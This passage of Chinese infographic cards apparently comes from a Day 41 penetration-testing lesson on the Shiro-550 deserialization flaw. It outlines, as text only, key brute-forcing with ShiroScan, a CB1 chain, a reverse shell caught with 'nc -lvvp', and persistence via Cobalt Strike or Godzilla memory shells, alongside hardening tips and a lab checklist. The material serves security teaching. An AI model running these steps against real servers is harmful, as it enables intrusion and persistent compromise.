  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 禁用JMX远程管理 + 拦截 T3/IIOP 端口</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gqg7krzxh" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gqg7krzxh)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试：为什么漏洞叫Shiro-550？</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro项目 JIRA Issue 编号 SHIRO-550</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2016年公开 CVE-2016-4437</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">核心问题: AES加密密钥是硬编码写死在代码</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">攻击者知道密钥→可构造任意Cookie</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">反序列化 CB1/CC链 → 服务器RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gkxa59rh6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gkxa59rh6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 实战：SpringBoot+Shiro 打靶</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 访问 /login → 响应 rememberMe=deleteMe 指纹命中</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 加载 ShiroScan → 自动爆破100+密钥 → 成功命中</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ ShiroScan 自动选择 CB1链 → 发送请求</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 目标服务器 nc -lvvp 接收到反弹shell 上线</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 后续迁移CS/哥斯拉内存马 持久化</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gxnwmfm5a" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gxnwmfm5a)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚠️ 常见报错与排查8条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">javax.crypto.BadPaddingException → 密钥错/IV错</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Illegal key size → JDK未装JCE无限制策略</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ClassNotFound CB1 → 目标不含beanutils</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Length 15 not 16 → Base64解码异常</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">NoSuchAlgorithm: AES/GCM → JDK加密包损坏</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gzcqwb7da" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gzcqwb7da)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 下一步深挖路线</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① ysoserial 源码阅读 每条链手工推导</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② CommonsCollections 原理 手写LazyMap</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ Java Instrument + Agent 内存马原理</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ RASP 拦截原理 + 对抗绕过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ JEP 290 序列化白名单过滤 配置</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gc8s8yk26" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gc8s8yk26)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day41 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro指纹识别 8种方法 全掌握</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Key字典爆破 Vulhub Shiro靶机 命中</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ysoserial CB1 Python手工加密 成功</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ShiroScan 一键检测+利用 成功</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro-721 Padding Oracle原理 能讲清</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固后550/721均失效 验证成功</text>
</svg>
